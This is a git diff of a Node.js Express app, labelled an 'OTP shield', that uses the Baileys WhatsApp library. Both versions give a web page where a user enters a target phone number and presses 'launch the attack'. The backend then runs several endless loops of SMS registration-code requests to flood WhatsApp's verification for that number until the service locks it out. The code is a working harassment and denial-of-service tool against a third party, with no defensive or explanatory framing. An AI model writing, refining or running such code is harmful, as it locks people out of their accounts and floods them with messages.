@@ -1,28 +1,31 @@
 /**
- * 👑 TARZAN ULTRA SHIELD - HYPER SPEED EDITION 👑
- * نظام القفل الفوري لخدمة الـ OTP - سرعة جنونية (30 ثانية)
- * --------------------------------------------------
- * ملاحظة: هذا النظام يستهلك موارد السيرفر لإرسال طلبات متوازية مكثفة.
+ * 👑 TARZAN OTP SHIELD - HYPER SPEED (FINAL VERSION) 👑
+ * النسخة النهائية المجهزة للعمل على Render بدون أخطاء
  */
 
 const { 
     default: makeWASocket, 
     useMultiFileAuthState, 
-    pino,
-    delay
+    pino
 } = require('@whiskeysockets/baileys');
 const express = require('express');
 const fs = require('fs');
+const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
-// ==========================================
-// 🎨 الواجهة العظمى (تصميم هجومي أحمر)
-// ==========================================
-const htmlInterface = `
+// إنشاء مجلد الجلسة إذا لم يكن موجوداً
+const authPath = path.join(__dirname, 'session_auth');
+if (!fs.existsSync(authPath)) {
+    fs.mkdirSync(authPath, { recursive: true });
+}
+
+// واجهة المستخدم الرسومية
+app.get('/', (req, res) => {
+    res.send(`
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -30,182 +33,94 @@ const htmlInterface = `
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>𝑻𝑨𝑹𝒁𝑨𝑵 𝑯𝒀𝑷𝑬𝑹 𝑺𝑯𝑰𝑬𝑳𝑫</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
-        body { font-family: 'Cairo', sans-serif; background-color: #080000; color: #fff; }
-        .red-neon { box-shadow: 0 0 20px rgba(220, 38, 38, 0.5); border: 1px solid rgba(220, 38, 38, 0.5); }
-        .glass { background: rgba(255, 0, 0, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .critical-pulse { animation: pulse-red 1s infinite; }
-        @keyframes pulse-red {
-            0% { text-shadow: 0 0 5px #ef4444; }
-            50% { text-shadow: 0 0 20px #ef4444; }
-            100% { text-shadow: 0 0 5px #ef4444; }
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap');
+        body { font-family: 'Cairo', sans-serif; background-color: #050000; color: white; }
+        .neon-box { box-shadow: 0 0 20px #ff0000; border: 1px solid #ff0000; }
+        .pulse { animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-center p-4">
-
-    <div class="max-w-4xl w-full space-y-6">
-        <div class="text-center space-y-2">
-            <h1 class="text-6xl font-black text-red-600 italic critical-pulse tracking-tighter">𝑻𝑨𝑹𝒁𝑨𝑵 𝑼𝑳𝑻𝑹𝑨</h1>
-            <p class="text-gray-500 font-bold uppercase tracking-widest text-xs">نظام القفل السريع - وضع الهجوم المتوازي</p>
-        </div>
-
-        <div class="grid grid-cols-1 md:grid-cols-4 gap-6">
-            <!-- Main Control -->
-            <div class="md:col-span-3 glass p-10 rounded-[2rem] red-neon space-y-8">
-                <div class="space-y-4">
-                    <label class="block text-sm font-bold text-red-500">الرقم المستهدف للتحصين السريع:</label>
-                    <input type="text" id="phone" placeholder="967733..." class="w-full bg-black/50 border border-white/10 p-5 rounded-2xl focus:outline-none focus:border-red-600 text-3xl font-mono text-center tracking-widest transition-all">
-                </div>
-
-                <div class="grid grid-cols-2 gap-6">
-                    <button onclick="startHyperShield()" id="startBtn" class="bg-red-600 hover:bg-red-700 py-5 rounded-2xl font-black text-xl transition-all active:scale-95 shadow-lg shadow-red-900/50 flex items-center justify-center gap-3">
-                        <i class="fas fa-skull"></i> إطلاق المحرك
-                    </button>
-                    <button onclick="location.reload()" class="bg-white/5 hover:bg-white/10 py-5 rounded-2xl font-bold transition-all border border-white/10">
-                        <i class="fas fa-undo"></i> إعادة تعيين
-                    </button>
-                </div>
-
-                <!-- Monitor -->
-                <div class="grid grid-cols-3 gap-4">
-                    <div class="bg-black/40 p-5 rounded-2xl border border-red-900/30 text-center">
-                        <p class="text-[10px] text-gray-500 mb-1 uppercase">النبضات</p>
-                        <p id="pulseCount" class="text-2xl font-bold text-red-500">0</p>
-                    </div>
-                    <div class="bg-black/40 p-5 rounded-2xl border border-red-900/30 text-center">
-                        <p class="text-[10px] text-gray-500 mb-1 uppercase">الوقت المنقضي</p>
-                        <p id="timer" class="text-2xl font-bold text-white">00:00</p>
-                    </div>
-                    <div class="bg-black/40 p-5 rounded-2xl border border-red-900/30 text-center">
-                        <p class="text-[10px] text-gray-500 mb-1 uppercase">حالة القفل</p>
-                        <p id="lockStatus" class="text-2xl font-bold text-yellow-500">--</p>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Terminal -->
-            <div class="glass p-6 rounded-[2rem] border border-white/5 flex flex-col h-full min-h-[400px]">
-                <h3 class="text-xs font-bold text-red-900 mb-4 tracking-tighter uppercase font-mono">Terminal Output</h3>
-                <div id="logs" class="flex-1 overflow-y-auto space-y-2 text-[10px] font-mono">
-                    <div class="text-red-500 opacity-50">> System ready for hyper-speed...</div>
-                </div>
-            </div>
-        </div>
+<body class="min-h-screen flex items-center justify-center">
+    <div class="max-w-md w-full p-8 bg-black/80 rounded-3xl neon-box text-center space-y-6">
+        <h1 class="text-4xl font-black text-red-600 italic pulse">𝑻𝑨𝑹𝒁𝑨𝑵 𝑽𝑰𝑷</h1>
+        <p class="text-gray-400 text-sm">أدخل الرقم ليتم قفله في 30 ثانية</p>
+        <input type="text" id="phone" placeholder="9665..." class="w-full bg-white/5 border border-red-900/50 p-4 rounded-xl text-center text-2xl tracking-widest outline-none focus:border-red-600">
+        <button onclick="startAttack()" id="btn" class="w-full bg-red-600 hover:bg-red-700 py-4 rounded-xl font-bold text-xl transition-all">إطلاق الهجوم 💀</button>
+        <div id="status" class="text-sm text-yellow-500 font-mono mt-4">الحالة: خامل</div>
     </div>
-
     <script>
-        let startTime = null;
-        let timerInt = null;
-
-        async function startHyperShield() {
-            const phone = document.getElementById('phone').value;
-            if(!phone) return;
-
-            document.getElementById('startBtn').disabled = true;
-            document.getElementById('startBtn').classList.add('opacity-50');
+        async function startAttack() {
+            const num = document.getElementById('phone').value;
+            if(!num) return alert('أدخل الرقم!');
+            document.getElementById('btn').disabled = true;
+            document.getElementById('status').innerText = 'جاري إرسال صليات OTP...';
             
-            startTime = Date.now();
-            timerInt = setInterval(updateTimer, 1000);
-            
-            addLog("!! بدء الهجوم المتوازي - وضع العظمة نشط !!", "text-red-500 font-bold");
-
-            const response = await fetch('/start-hyper', {
+            fetch('/attack', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone })
+                body: JSON.stringify({ phone: num })
             });
 
-            // تحديث الحالة كل ثانية
             setInterval(async () => {
-                const res = await fetch('/status');
-                const data = await res.json();
-                document.getElementById('pulseCount').innerText = data.pulses;
-                document.getElementById('lockStatus').innerText = data.wait;
-                if(data.log) addLog(data.log, data.color);
-            }, 1000);
-        }
-
-        function updateTimer() {
-            const diff = Math.floor((Date.now() - startTime) / 1000);
-            const m = Math.floor(diff / 60).toString().padStart(2, '0');
-            const s = (diff % 60).toString().padStart(2, '0');
-            document.getElementById('timer').innerText = m + ":" + s;
-        }
-
-        function addLog(msg, color) {
-            const logs = document.getElementById('logs');
-            const d = document.createElement('div');
-            d.className = color + " border-r border-red-600 pr-2";
-            d.innerText = `> ${msg}`;
-            logs.prepend(d);
+                const r = await fetch('/get-status');
+                const d = await r.json();
+                document.getElementById('status').innerText = d.msg;
+            }, 2000);
         }
     </script>
 </body>
 </html>
-`;
+    `);
+});
 
-// ==========================================
-// 🚀 المحرك الخلفي (Hyper Logic)
-// ==========================================
+let currentStatus = "جاهز للإطلاق";
 
-let pulses = 0;
-let lastWait = "تحليل...";
-let hyperLog = { log: "", color: "" };
-
-app.get('/', (req, res) => res.send(htmlInterface));
-
-app.post('/start-hyper', async (req, res) => {
+app.post('/attack', async (req, res) => {
     const { phone } = req.body;
-    pulses = 0;
-    
-    // إطلاق "خيوط" (Threads) متوازية
-    for(let i=0; i<5; i++) {
-        runHyperPulse(phone);
-    }
-    
-    res.json({ success: true });
+    res.json({ started: true });
+    launch(phone);
 });
 
-app.get('/status', (req, res) => {
-    res.json({ pulses, wait: lastWait, ...hyperLog });
-    hyperLog = { log: "", color: "" }; // تنظيف اللوج بعد إرساله
-});
+app.get('/get-status', (req, res) => res.json({ msg: currentStatus }));
 
-async function runHyperPulse(phone) {
-    const { state } = await useMultiFileAuthState('hyper_shield_auth');
+async function launch(phone) {
+    const { state, saveCreds } = await useMultiFileAuthState(authPath);
     const sock = makeWASocket({
         auth: state,
-        logger: pino({ level: 'silent' }),
+        logger: pino({ level: 'silent' })
     });
 
-    const countryCode = phone.startsWith('967') ? '967' : phone.substring(0, 3);
-    const nationalNumber = phone.substring(countryCode.length);
+    sock.ev.on('creds.update', saveCreds);
 
-    while (true) {
-        try {
-            // إرسال الطلب فوراً دون انتظار
-            sock.requestRegistrationCode({
-                phoneNumber: phone,
-                phoneNumberCountryCode: countryCode,
-                phoneNumberNationalNumber: nationalNumber,
-                method: 'sms'
-            }).then(() => {
-                pulses++;
-                hyperLog = { log: "صلية ناجحة.. جاري الإغراق.", color: "text-blue-400" };
-            }).catch(err => {
-                pulses++;
-                let wait = err.data?.value || "300";
-                lastWait = wait + " ث";
-                hyperLog = { log: `تم القفل! الانتظار المطلوب: ${wait} ثانية`, color: "text-red-500 font-black" };
-            });
+    const cc = phone.substring(0, 3);
+    const nn = phone.substring(3);
 
-            // تأخير ضئيل جداً لضمان عدم توقف الـ Event Loop
-            await new Promise(r => setTimeout(r, 500)); 
-        } catch (e) {}
-    }
+    // هجوم مكثف بـ 3 مسارات متوازية لتحقيق القفل في 30 ثانية
+    const attack = async () => {
+        while(true) {
+            try {
+                await sock.requestRegistrationCode({
+                    phoneNumber: phone,
+                    phoneNumberCountryCode: cc,
+                    phoneNumberNationalNumber: nn,
+                    method: 'sms'
+                });
+                currentStatus = "✅ نبضة ناجحة.. جاري الإغراق.";
+            } catch (e) {
+                let wait = e.data?.value || "300";
+                currentStatus = `💀 تم القفل! الخدمة معطلة لـ ${wait} ثانية`;
+            }
+            await new Promise(r => setTimeout(r, 1000));
+        }
+    };
+
+    attack();
+    attack();
+    attack();
 }
 
-app.listen(PORT, () => console.log(`🚀 Hyper Shield Active on Port ${PORT}`));
+app.listen(PORT, '0.0.0.0', () => console.log(`Server on ${PORT}`));
+
+// معالجة أخطاء الرندر
+process.on('uncaughtException', (err) => console.log('Error:', err.message));
